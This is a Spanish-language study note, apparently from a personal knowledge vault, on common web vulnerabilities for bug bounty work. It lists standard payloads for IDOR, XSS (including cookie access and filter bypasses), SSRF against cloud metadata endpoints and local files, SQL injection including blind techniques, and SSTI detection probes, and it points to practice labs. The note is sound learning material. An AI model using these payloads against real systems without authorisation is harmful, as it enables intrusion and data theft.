---
title: "Vulnerabilidades Web"
type: note
status: active
tags:
  - seguridad
  - web
  - vulnerabilidades
  - bugbounty
aliases:
  - Web Vulnerabilities
  - OWASP Top 10
created: 2026-06-13
updated: 2026-06-13
---

# Vulnerabilidades Web

> [!INFO] Fuente
> Basado en OWASP Top 10, PortSwigger Web Security Academy, y reportes reales de HackerOne.

---

## Clasificacion por frecuencia en bug bounty

| # | Vulnerabilidad | Severidad tipica | Dificultad |
|---|---------------|------------------|------------|
| 1 | IDOR / BAC | Alta | Baja-Media |
| 2 | XSS | Media-Alta | Baja-Media |
| 3 | SSRF | Critica | Media-Alta |
| 4 | SQL Injection | Critica | Media |
| 5 | Open Redirect | Baja | Baja |
| 6 | File Upload | Alta | Media |
| 7 | SSTI | Critica | Alta |
| 8 | CSRF | Media | Baja |
| 9 | ATO (Account Takeover) | Alta-Critica | Varía |
| 10 | Business Logic | Varía | Media-Alta |

---

## IDOR / Broken Access Control

> [!DEFINITION] Definicion
> Ocurre cuando un usuario puede acceder a recursos de otros usuarios modificando parametros (IDs, UUIDs, etc.).

### Pruebas

```http
GET /api/user/12345 HTTP/1.1     # Probar con 12346, 12347
GET /api/invoice/INV-001 → INV-002
```

### Payloads comunes

```
user_id=123 → user_id=124
document=abc → document=abd
/api/v1/user/me → /api/v1/user/admin
UUIDs predecibles (secuenciales, timestamps)
```

---

## XSS (Cross-Site Scripting)

> [!DEFINITION] Definicion
> Inyeccion de codigo JS en paginas vistas por otros usuarios.

### Tipos

| Tipo | Descripcion | Severidad |
|------|-------------|-----------|
| Reflejado | El payload esta en la URL/parametro | Media |
| Almacenado | El payload se guarda en el servidor | Alta |
| DOM-based | El payload modifica el DOM del lado cliente | Media |

### Payloads basicos

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'"><img src=x onerror=alert(1)>
javascript:alert(document.cookie)
```

### Bypass filters

```html
<scr<script>ipt>alert(1)</scr</script>ipt>        <!-- Filter bypass -->
%3Cscript%3Ealert(1)%3C/script%3E                  <!-- HTML encode -->
\\u003cscript\\u003ealert(1)\\u003c/script\\u003e   <!-- Unicode -->
```

---

## SSRF (Server-Side Request Forgery)

> [!DEFINITION] Definicion
> El servidor hace peticiones a recursos internos a partir de input del usuario.

### Pruebas

```
url=https://target.com → url=http://169.254.169.254/   (AWS metadata)
url=https://target.com → url=http://127.0.0.1:8080/
url=https://target.com → url=file:///etc/passwd
```

### Cloud Metadata

```
AWS:      http://169.254.169.254/latest/meta-data/
GCP:      http://metadata.google.internal/computeMetadata/v1/
Azure:    http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

> [!WARNING] Critico
> SSRF a metadata cloud es uno de los bugs mas graves. Puede exponer access keys completas de AWS/GCP/Azure.

---

## SQL Injection

> [!DEFINITION] Definicion
> Inyeccion de comandos SQL a traves de input de usuario.

### Pruebas basicas

```sql
' OR '1'='1
' OR 1=1--
" OR 1=1--
admin' --
1' ORDER BY 1--    # Encontrar numero de columnas
' UNION SELECT 1,2,3--  # Extraer datos
```

### Blind SQLi

```sql
' AND SLEEP(5)--    # Time-based
' AND 1=1--          # Content-based (true)
' AND 1=2--          # Content-based (false)
```

---

## SSTI (Server-Side Template Injection)

> [!DEFINITION] Definicion
> Inyeccion en motores de templates (Jinja2, Twig, Freemarker, Velocity).

### Deteccion

```
{{7*7}} → 49               # Jinja2, Twig, etc.
${7*7} → 49                 # Freemarker, Velocity
#{7*7} → 49                 # Pebble
*{7*7} → 49                 # Thymeleaf
```

---

## Recursos de practica

| Recurso | URL |
|---------|-----|
| PortSwigger Academy | portswigger.net/web-security |
| OWASP Juice Shop | github.com/juice-shop/juice-shop |
| DVWA | github.com/digininja/DVWA |
| HackTheBox | hackthebox.com |
| PentesterLab | pentesterlab.com |
| PwnFunction (YouTube) | youtube.com/@PwnFunction |
| Rana Khalil (YouTube) | youtube.com/@RanaKhalil |

---

## Ver tambien

- [[SEGURIDAD/Roadmap Bug Bounty]]
- [[SEGURIDAD/Reconocimiento]]
- [[SEGURIDAD/Hacking Activo]]
- [[SEGURIDAD/00 - INDICE]]
